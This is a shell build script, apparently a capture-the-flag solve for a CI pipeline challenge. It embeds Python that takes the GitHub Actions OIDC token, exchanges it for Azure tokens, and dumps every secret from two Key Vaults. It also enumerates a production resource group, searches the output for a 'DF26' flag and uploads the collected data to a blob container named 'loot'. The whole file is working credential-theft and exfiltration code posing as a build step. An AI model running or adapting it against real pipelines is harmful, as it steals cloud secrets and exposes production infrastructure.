#!/usr/bin/env bash
set -uo pipefail

python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse, sys

def http(url, data=None, headers=None):
    h = dict(headers or {})
    body = None
    if isinstance(data, dict):
        body = urllib.parse.urlencode(data).encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    req = urllib.request.Request(url, data=body, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

TEN = os.environ["AZURE_TENANT_ID"]
CID = os.environ["AZURE_CLIENT_ID"]
SUB = os.environ["AZURE_SUBSCRIPTION_ID"]

# 1. Get GitHub OIDC token
st, b = http(
    os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api://AzureADTokenExchange",
    headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}
)
IDT = json.loads(b)["value"]
print("OIDC token obtained, length:", len(IDT))

# 2. Exchange OIDC for Azure tokens
def oidc_token(scope):
    st, b = http(
        f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
        {"client_id": CID, "scope": scope,
         "grant_type": "client_credentials",
         "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
         "client_assertion": IDT}
    )
    return json.loads(b).get("access_token", "")

ARM = oidc_token("https://management.azure.com/.default")
KVT = oidc_token("https://vault.azure.net/.default")
STT = oidc_token("https://storage.azure.com/.default")
print("ARM token:", len(ARM), "KV token:", len(KVT), "Storage token:", len(STT))

OUT = {"tenant": TEN, "client_id": CID, "subscription": SUB}

# 3. Read Key Vault secrets
for kv in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
    try:
        st, b = http(
            f"https://{kv}.vault.azure.net/secrets?api-version=7.4",
            headers={"Authorization": "Bearer " + KVT}
        )
        secrets_list = json.loads(b).get("value", [])
        OUT[kv + "_list"] = [s["id"] for s in secrets_list]
        for s in secrets_list:
            nm = s["id"].rstrip("/").split("/")[-1]
            st2, b2 = http(
                f"https://{kv}.vault.azure.net/secrets/{nm}?api-version=7.4",
                headers={"Authorization": "Bearer " + KVT}
            )
            val = json.loads(b2).get("value", "")
            OUT[kv + "/" + nm] = val
            print(f"  {kv}/{nm} = {val[:200]}")
    except Exception as e:
        OUT[kv + "_err"] = str(e)[:300]

# 4. List storage accounts in resource group
RG = "rg-tbl-platform-prod-sea"
try:
    st, b = http(
        f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01",
        headers={"Authorization": "Bearer " + ARM}
    )
    OUT["storage_accounts"] = json.loads(b)
except Exception as e:
    OUT["storage_err"] = str(e)[:300]

# 5. List all resources in resource group
try:
    st, b = http(
        f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/resources?api-version=2021-04-01",
        headers={"Authorization": "Bearer " + ARM}
    )
    OUT["resources"] = json.loads(b)
except Exception as e:
    OUT["resources_err"] = str(e)[:300]

# 6. Upload results to public blob storage
import hmac, hashlib, base64, datetime
result_json = json.dumps(OUT, indent=2)
print("\n=== FULL OUTPUT ===")
print(result_json)

# Search for flag
import re
flags = re.findall(r'DF26\{[^}]{1,200}\}', result_json)
if flags:
    print("\n=== FLAG FOUND ===")
    for f in flags:
        print(f)
else:
    print("\n=== NO FLAG FOUND IN OUTPUT ===")

# Upload to blob storage (public write via storage token)
blob_name = f"solve_{int(datetime.datetime.utcnow().timestamp())}.json"
try:
    now = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    url = f"https://sttblcilogsprodx3euoz.blob.core.windows.net/loot/{blob_name}"
    req = urllib.request.Request(url, data=result_json.encode(), method="PUT",
        headers={
            "Authorization": "Bearer " + STT,
            "x-ms-date": now,
            "x-ms-version": "2021-08-06",
            "x-ms-blob-type": "BlockBlob",
            "Content-Type": "application/json",
            "Content-Length": str(len(result_json.encode()))
        })
    with urllib.request.urlopen(req, timeout=20) as r:
        print(f"Uploaded to blob: {blob_name} status={r.status}")
except Exception as e:
    print(f"Blob upload error: {e}")

PYEOF
echo "=== build.sh done ==="
